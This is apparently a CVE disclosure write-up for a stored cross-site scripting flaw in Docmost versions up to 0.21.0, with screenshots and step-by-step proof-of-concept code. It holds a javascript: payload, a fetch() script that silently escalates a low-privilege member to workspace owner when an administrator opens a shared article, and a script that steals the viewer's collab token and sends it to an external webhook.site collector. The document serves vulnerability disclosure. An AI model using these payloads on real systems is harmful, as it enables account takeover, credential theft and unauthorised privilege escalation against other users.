# CVE-ID
CVE-2025-55574

# Bug author
markbug

# Product
docmost

GitHub Link: https://github.com/docmost/docmost

# Description
In Docmost versions <= 0.21.0, an XSS vulnerability exists in published articles. This vulnerability can be exploited to steal the credentials of any user who views content containing the XSS payload. If a system administrator is targeted, the attacker can further achieve stealth privilege escalation.

Vulnerability Type: XSS

Vulnerability Severity: high

Affected Version <= 0.21.0

# Detailed Procedure
A member creates a new article as follows and inserts an XSS payload into it, as shown below:
<img width="2380" height="778" alt="image" src="https://github.com/user-attachments/assets/1976a626-3900-4b3e-ad60-70f26b56f913" />
wite the pyload ：`javascript:console.log('xss')`
<img width="2214" height="1042" alt="image" src="https://github.com/user-attachments/assets/4455deb2-1241-41c4-84dc-58537717ba8b" />
After clicking the Embed link button, the result of the XSS code execution can be observed in the browser console.
<img width="2113" height="942" alt="image" src="https://github.com/user-attachments/assets/d1adfe69-7991-487c-99a2-75d0ec1bfcf6" />

## Privilege escalation
By inserting the following code into the article, when a high-privilege system user accesses the article, the low-privilege user's role can be silently elevated to "owner", the highest permission level.
```javascript
fetch('http://172.245.168.131:3000/api/workspace/members/change-role', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    userId: '019856a5-5642-7256-9b91-2edccd701d92',
    role: 'owner'
  })
})
.then(response => response.json())
.then(data => {
  console.log('Change role response:', data);
})
.catch(error => {
  console.error('Error:', error);
});
```
It can be seen that when the low-privilege user inserts the code, a request is automatically made to the /api/workspace/members/change-role endpoint, but the server returns a 403.
<img width="2467" height="1369" alt="image" src="https://github.com/user-attachments/assets/066564f0-db9f-49c6-8777-0f74ed5f3b08" />
Next, share the article:
<img width="2373" height="1147" alt="image" src="https://github.com/user-attachments/assets/d1145bd5-1176-40a3-9a82-9c7aab5fe2a9" />
Then, send the shared article link to the high-privilege user. When the high-privilege user accesses it, a request to the `/api/workspace/members/change-role` endpoint will also be automatically made. As shown below, the response from the `/api/workspace/members/change-role` endpoint is 200.
<img width="2515" height="1344" alt="image" src="https://github.com/user-attachments/assets/daa65cc7-3b21-4abb-8149-014bea255b52" />
When the user page is refreshed again, it is found that the low-privilege user, member1, has already been elevated to the highest privilege, owner, as shown below:
<img width="2077" height="735" alt="image" src="https://github.com/user-attachments/assets/fd17d645-0ee7-4701-b332-db73a91b3cf3" />

## Session hijacking
The principle behind the system endpoint /api/auth/collab-token returning a token allows XSS code to be inserted into the article that needs to be shared. This can enable arbitrary user credential theft. The code is as follows:
```javascript
fetch('http://172.245.168.131:3000/api/auth/collab-token', {
  method: 'GET',
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  const encodedData = encodeURIComponent(JSON.stringify(data));
  return fetch('https://webhook.site/14767674-eec4-40c4-917c-853bb1275610', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `data=${encodedData}`
  });
})
.then(response => {
  if (response.ok) {
    console.log('Data sent successfully');
  } else {
    console.error('Failed to send data', response.status);
  }
})
.catch(error => {
  console.error('Error:', error);
});
```

